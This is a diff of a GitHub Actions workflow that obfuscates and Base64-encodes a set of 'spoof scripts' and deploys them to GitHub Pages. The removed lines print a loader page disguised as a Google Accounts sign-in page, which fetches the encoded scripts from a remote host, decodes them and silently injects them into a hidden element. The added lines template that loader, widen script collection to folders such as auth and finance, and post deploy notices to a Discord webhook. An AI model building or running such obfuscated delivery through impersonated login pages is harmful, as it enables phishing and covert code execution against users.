@@ -1,13 +1,18 @@
-name: 🔁 Auto-obfuscate, inject, and deploy Loader
+name: 🔁 Auto-obfuscate, manifest, catalog, inject, deploy Loader
 
 on:
   push:
     paths:
-      - 'src-scripts/*.js'
+      - 'src-scripts/**/*.js'
+      - 'scripts/index-template.html'
+      - 'scripts/catalog-template.html'
       - '.github/workflows/update-index.yml'
   schedule:
-    - cron: "0 */6 * * *" # every 6 hours
+    - cron: "0 */6 * * *"
   workflow_dispatch:
+
+env:
+  DISCORD_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
 
 jobs:
   update:
@@ -22,73 +27,62 @@ jobs:
         with:
           node-version: 18
 
-      - name: 📦 Install obfuscator
+      - name: 📦 Install tooling
         run: |
-          npm install -g javascript-obfuscator
+          npm install -g javascript-obfuscator jq
 
-      - name: 🔐 Obfuscate and Base64-encode spoof scripts
+      - name: 🔐 Obfuscate and Base64-encode all spoof scripts (recursive, monorepo)
         run: |
-          mkdir -p obfuscated
-          rm -f obfuscated/*.js.b64 obfuscated/*.ob.js || true
-          for f in src-scripts/*.js; do
-            base=$(basename "$f" .js)
-            javascript-obfuscator "$f" --output "obfuscated/${base}.ob.js" --compact true --self-defending true --control-flow-flattening true
-            base64 "obfuscated/${base}.ob.js" > "obfuscated/${base}.js.b64"
+          OUTDIR="apps/loader/public/obfuscated"
+          SRCDIRS="src-scripts scripts/auth scripts/device scripts/finance scripts/location scripts/network scripts/security scripts/social"
+          mkdir -p "$OUTDIR"
+          find $SRCDIRS -type f -name "*.js" | while read f; do
+            base=$(echo "$f" | sed 's|/|-|g' | sed 's|\.js$||')
+            javascript-obfuscator "$f" --output "$OUTDIR/${base}.ob.js" --compact true --self-defending true --control-flow-flattening true
+            base64 "$OUTDIR/${base}.ob.js" > "$OUTDIR/${base}.js.b64"
           done
 
-      - name: 🔁 Generate index.html loader
+      - name: 🔁 Generate index.html loader from template
         run: |
-          out="index.html"
-          cd obfuscated/
+          OUTDIR="apps/loader/public/obfuscated"
+          LOADER="apps/loader/public/index.html"
+          cd "$OUTDIR"
           files=$(find . -name "*.js.b64" | sed 's|^\./||g' | jq -R . | jq -s .)
-          cd ..
-          cat > "$out" <<EOF
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Sign in – Google Accounts</title>
-  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png">
-  <style>
-    body { margin: 0; background: #fff; font-family: "Roboto", sans-serif; }
-    .hidden-loader { position: fixed; top: -9999px; left: -9999px; visibility: hidden; }
-  </style>
-</head>
-<body>
-  <div class="hidden-loader" id="injector"></div>
-  <script>
-    const spoofTargets = $files;
-    const cdnBase = "https://popdeuxrem.github.io/shadow-scripts/obfuscated/";
-    spoofTargets.forEach(async (file) => {
-      try {
-        const res = await fetch(cdnBase + file);
-        const encoded = await res.text();
-        const decoded = atob(encoded);
-        const script = document.createElement("script");
-        script.textContent = decoded;
-        document.getElementById("injector").appendChild(script);
-        console.log(\`[✓] Injected: \${file}\`);
-      } catch (e) {
-        console.error(\`[✗] Failed: \${file}\`, e);
-      }
-    });
-  </script>
-</body>
-</html>
-EOF
+          cd ../..
+          sed "s|__SPOOF_TARGETS__|$files|" scripts/index-template.html > "$LOADER"
 
-      - name: 📤 Commit & Push
+      - name: 📝 Generate manifest.json and catalog.html
+        run: |
+          OUTDIR="apps/loader/public/obfuscated"
+          MANIFEST="apps/loader/public/manifest.json"
+          CATALOG="apps/loader/public/catalog.html"
+          cd "$OUTDIR"
+          # manifest.json (array)
+          find . -name "*.js.b64" | sed 's|^\./||g' | jq -R . | jq -s . > ../../manifest.json
+          # catalog.html
+          list=$(find . -name "*.js.b64" | sort | sed "s|^\./||g" | awk '{printf "<li><span class=\"url\">%s</span></li>", $1}')
+          cd ../..
+          sed "s|__CATALOG_LIST__|$list|" scripts/catalog-template.html > "$CATALOG"
+
+      - name: 📤 Commit & Push if changed
         run: |
           git config user.name "popdeuxrem"
           git config user.email "174709939+popdeuxrem@users.noreply.github.com"
-          git add obfuscated/ index.html
-          git diff --cached --quiet || git commit -m "🔁 Auto-obfuscate, base64, inject, deploy [skip ci]"
-          git push
+          git add apps/loader/public/obfuscated/ apps/loader/public/index.html apps/loader/public/manifest.json apps/loader/public/catalog.html
+          git diff --cached --quiet || (git commit -m "🔁 Auto-obfuscate, base64, inject, manifest, catalog, deploy [skip ci]" && git push)
 
       - name: 🚀 Deploy to GitHub Pages
         uses: peaceiris/actions-gh-pages@v4
         with:
           github_token: ${{ secrets.GITHUB_TOKEN }}
-          publish_dir: ./
+          publish_dir: ./apps/loader/public
           publish_branch: gh-pages
+
+      - name: 💬 Discord notification
+        if: env.DISCORD_WEBHOOK != ''
+        run: |
+          commit_url="https://github.com/${{ github.repository }}/commit/${{ github.sha }}"
+          num_scripts=$(ls apps/loader/public/obfuscated/*.js.b64 | wc -l)
+          curl -X POST -H "Content-Type: application/json" \
+            -d "{\"username\": \"ShadowScriptsBot\", \"content\": \"Deployed $num_scripts spoof scripts. [View Commit]($commit_url) | [Catalog](https://popdeuxrem.github.io/shadow-scripts/catalog.html)\"}" \
+            "$DISCORD_WEBHOOK"
